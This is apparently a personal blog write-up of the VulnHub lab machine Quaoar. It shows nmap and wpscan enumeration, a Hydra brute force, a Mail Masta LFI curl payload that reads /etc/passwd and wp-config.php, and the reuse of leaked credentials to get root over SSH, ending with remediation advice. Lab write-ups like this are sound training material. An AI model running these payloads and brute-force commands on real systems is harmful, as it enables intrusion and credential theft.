---
layout: default
category: web
tags: [vm, vulnhub]
---

# VulnHub: Quaoar

Feeling a bit rusty on my pentesting skills, I decided to toy around with some vulnerable machines. Quaoar, found on VulnHub, seemed like a good candidate to spend a couple of hours on.

# 1. Determine Services
The first step is to determine what the purpose of the host is. We use nmap to conduct a port scan and attempt to identify the operating system and service versions:

```
# nmap -sS -sV -p- -O -oN nmap.txt 192.168.1.25

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-12 19:38 PDT
Nmap scan report for 192.168.1.25
Host is up (0.00029s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain      ISC BIND 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
995/tcp open  ssl/pop3    Dovecot pop3d
MAC Address: 00:0C:29:F1:60:45 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2126.47 seconds
```

The server has a wide attack surface as it is configured with quite a few services; DNS, mail, Samba, SSH, and a web server.

Mail software is reknown for vulnerabilities, so Dovecot is a candidate.

We are also running Samba, which presents additional attacks, often related to misconfigurations. For example, open shares, and not limiting authentication attempts.

It appears that we are dealing with a mail server. Possibly a web server as well.

# 2. Service Enumeration

## DNS Enumeration
While there are [vulnerabilties](https://www.cvedetails.com/vulnerability-list/vendor_id-64/product_id-144/version_id-111391/ISC-Bind-9.8.1.html) associated with ISC Bind 9.8.1, they are generally denial of service related (with a bypass relating to a Windows server).

## Apache Enumeration
Apache returns the standard 404, leaking version info and OS (Apache/2.2.22 (Ubuntu)).

Wappalyzer shows us that we are running PHP 5.3.10. A quick Nikto scan identifies that there is a WordPress installation located at ```/wordpress```, which is also apparent from browsing to ```robots.txt```.

Using BurpSuite to brute force directories against a DirBuster listing, we also find reference to an ```/upload``` directory.

### LEPTON CMS
Navigating to the ```/upload``` directory, we see that the site is powered by LEPTON, which is a Content Management System (CMS).

Searching for LEPTON vulnerabilities, we find a few possibilities. However, none of them pan out as the majority require authentication and/or running the installation/configuration. It appears that there is a misconfiguration, as Lepton is looking for resources from 192.168.0.190. While DNS poisoning seemed possible, enumeration should be completed to better evaluate our attack surface.

### WordPress
Running ```wpscan``` we find numerous possible vulnerabilities:

```
# wpscan http://192.168.1.25/wordpress
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.2
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.1.25/wordpress/
[+] Started: Wed Jul 12 19:48:36 2017

[!] The WordPress 'http://192.168.1.25/wordpress/readme.html' file exists exposing a version number
[+] Interesting header: SERVER: Apache/2.2.22 (Ubuntu)
[+] Interesting header: X-POWERED-BY: PHP/5.3.10-1ubuntu3
[+] XML-RPC Interface available under: http://192.168.1.25/wordpress/xmlrpc.php
[!] Upload directory has directory listing enabled: http://192.168.1.25/wordpress/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.1.25/wordpress/wp-includes/

[+] WordPress version 3.9.14 (Released on 2016-09-07) identified from advanced fingerprinting, meta generator, readme, links opml, stylesheets numbers
[!] 15 vulnerabilities identified from the version number

[!] Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
    Reference: https://wpvulndb.com/vulnerabilities/8716
    Reference: https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
[i] Fixed in: 3.9.15

...

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Finished: Wed Jul 12 19:48:38 2017
[+] Requests Done: 48
[+] Memory used: 16.805 MB
[+] Elapsed time: 00:00:01

```

While there are numerous vulnerabilities identified, most require authentication.

We can also use wpscan to attempt to brute force credentials for us:
```
wpscan --url http://192.168.1.25/wordpress --wordlist /usr/share/wordlists/rockyou.txt --username admin --threads 20
```

Before we do that though, we should verify that the site is not using multi-factor authentication that would get a brute force attack blocked.

Attempting to login to ```/wordpress/wp-login.php``` we try ```admin:admin``` and score an easy win.

Reviewing the installed plugins, we see that 'Mail Masta' is installed.

# 3. Exploitation

## Local File Inclusion (LFI)
```
Description: Mail Masta is email marketing plugin for Wordpress.
```

Since WordPress plugins are often less secure than WordPress core, and it is essentially the only plugin that was installed (Akismet is part of the default configuration, so does not really count), we search for Mail Masta vulnerabiltiies and find a [Local File Inclusion](https://www.exploit-db.com/exploits/40290/) vulnerability.

This seems promising as it may get us a shell. If not, we can use our admin credentials in WordPress to take care of that bit. Starting with the token LFI test, we try to grab the password file:
```
http://192.168.1.25/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_end.php?pl=/etc/passwd
```


```
# curl -s --url http://192.168.1.25/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/read=convert.base64-encode/resource=/etc/passwd | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
colord:x:104:109:colord colour management daemon,,,:/var/lib/colord:/bin/false
whoopsie:x:105:112::/nonexistent:/bin/false
avahi:x:106:115:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
bind:x:107:117::/var/cache/bind:/bin/false
postfix:x:108:118::/var/spool/postfix:/bin/false
dovecot:x:109:120:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:110:65534:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:111:121::/var/lib/landscape:/bin/false
libvirt-qemu:x:112:106:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:113:123:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
sshd:x:114:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:115:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
tomcat6:x:116:126::/usr/share/tomcat6:/bin/false
wpadmin:x:1001:1001::/home/wpadmin:/bin/sh
```

Since we are running SSH and we had an easy default with the WordPress admin account, what if ```wpadmin``` is another default?

```
# ssh wpadmin@192.168.1.25
The authenticity of host '192.168.1.25 (192.168.1.25)' can't be established.
ECDSA key fingerprint is SHA256:+ODdJgfptUyyVzKI9wDm804SlXxzmb4/BiKsHCnHGeg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.25' (ECDSA) to the list of known hosts.
wpadmin@192.168.1.25's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul 12 15:42:45 EDT 2017

  System load:  0.0               Processes:             101
  Usage of /:   30.5% of 7.21GB   Users logged in:       0
  Memory usage: 32%               IP address for eth0:   192.168.1.25
  Swap usage:   11%               IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Jul 12 15:42:03 2017
$ pwd
/home/wpadmin
$ ls -la
total 12
drwxr-xr-x 2 root    root    4096 Oct 22  2016 .
drwxr-xr-x 3 root    root    4096 Oct 24  2016 ..
-rw-r--r-- 1 wpadmin wpadmin   33 Oct 22  2016 flag.txt
$ cat flag.txt
2bafe61f03117ac66a73c3c514de796e
$ 
```

First of three flags obtained.

## Brute Force Authentication

With SMB running, we can also attempt to brute force credentials. This is a noisy approach, and really could be attempted against SSH as well. For Hydra, we configure our attack:

  -L = User list
  -P = Password list
  -e = Extra password checks:
      n = NULL password check, 
      s = Try username as password,
      r = Reverse username
  -t = Threads

```
# hydra -L users.txt -P /opt/betterdefaultpasslist/ssh.txt -e nsr -t 16 192.168.1.25 smb
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-07-12 20:41:50
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 64 tasks, 136 login tries (l:2/p:68), ~2 tries per task
[DATA] attacking service smb on port 445
[445][smb] host: 192.168.1.25   login: wpadmin   password: wpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-07-12 20:41:51
```

# 5. Post-Exploitation

## Privilege Escalation

Using shell or LFI, we can examine the WordPress configuration file and get access to MySQL:

```
# curl -s --url http://192.168.1.25/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/read=convert.base64-encode/resource=/var/www/wordpress/wp-config.php | base64 -d
<?php
/**
 * The base configurations of the WordPress.
...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');
...
```

Well that is too tempting not to try:

```
# ssh root@192.168.1.25
root@192.168.1.25's password: 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Jul 12 20:57:07 EDT 2017

  System load:  0.06              Processes:             101
  Usage of /:   30.5% of 7.21GB   Users logged in:       0
  Memory usage: 48%               IP address for eth0:   192.168.1.25
  Swap usage:   11%               IP address for virbr0: 192.168.122.1

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun Jan 15 19:23:45 2017 from desktop-g0lhb7o.snolet.com
root@Quaoar:~# ls
flag.txt  vmware-tools-distrib
root@Quaoar:~# cat flag.txt 
8e3f9ec016e3598c5eec11fd3d73f6fb
root@Quaoar:~#  find / -name flag.txt
/root/flag.txt
/home/wpadmin/flag.txt
root@Quaoar:~# 

```

Weak passwords... You don't find that in CTFs.

## Process Enumeration

Easy defaults get us two out of three flags. Where is the third? Tucked away in a standard enumeration location:
```
root@Quaoar:~# cat /etc/cron.d/php5
# /etc/cron.d/php5: crontab fragment for php5
#  This purges session files older than X, where X is defined in seconds
#  as the largest value of session.gc_maxlifetime from all your php.ini
#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
root@Quaoar:~# 
```

# 6. Conclusion

## False Flag
Looking at the two known files, we see that they have a length of 32. Searching for files that are 33 bytes in length, we find quite a few. A little bash-fu identifies what we think are the three flags:

```
# find / -type f -size 33c 2>/dev/null | xargs cat | grep -v " " | grep -o -w '\w\{32,32\}'
8e3f9ec016e3598c5eec11fd3d73f6fb
184b159199b5f40556a078e40000012c
2bafe61f03117ac66a73c3c514de796e
```

Until we realize that the third flag is really just the machine-id and it represents a false positive. This forced us to continue proper enumeration during the post-exploitation phase and rewarded our systematic persistence.

## Difficulty
The VM was advertised as very easy and certainly lived up to the rating. It was easy, but it also included some interesting paths to promote investigation and research.

## Remediation
It appears that the server was initially going to be a CMS using LEPTON, and configured to use a local mail server. 

WordPress and the Masta Mail plugin appear to have replaced this approach. The unused applicatoins were not purged, which increases the attack surface of the server.

Additionally, running outdated versions of software (WordPress) and supporting compoents (Masta Mail) left the system vulnerable to an unauthenticated attack. When combined with weak and easily guessed passwords, Quaoar was easily uprooted.
